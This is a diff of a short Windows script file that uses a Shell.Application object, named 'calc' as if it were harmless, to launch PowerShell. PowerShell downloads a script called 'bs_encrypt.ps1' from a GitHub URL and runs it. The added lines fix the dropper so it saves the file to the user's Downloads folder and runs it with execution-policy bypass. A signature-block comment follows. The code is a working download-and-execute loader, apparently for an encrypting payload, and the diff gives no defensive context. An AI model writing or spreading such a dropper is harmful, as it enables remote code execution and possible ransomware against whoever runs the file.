@@ -1,6 +1,6 @@
 var calc = new ActiveXObject("Shell.Application");
-calc.ShellExecute("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","-c Invoke-Webrequest -URI https://raw.githubusercontent.com/HoaSec/CR/main/bs_encrypt.ps1 -Outfile .\\","","open","1");
-calc.ShellExecute("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",".\\bs_encrypt.ps1","","open","1");
+calc.ShellExecute("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","-c Invoke-Webrequest -URI https://raw.githubusercontent.com/HoaSec/CR/main/bs_encrypt.ps1 -Outfile $env:USERPROFILE\\Downloads\\bs_encrypt.ps1","","open","1");
+calc.ShellExecute("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","-ExecutionPolicy Bypass -File $env:USERPROFILE\\Downloads\\bs_encrypt.ps1","","open","1");
 
 // SIG // Begin signature block
 // SIG // MIImVwYJKoZIhvcNAQcCoIImSDCCJkQCAQExDzANBglghkgBZQMEAgEFADB3Bgor
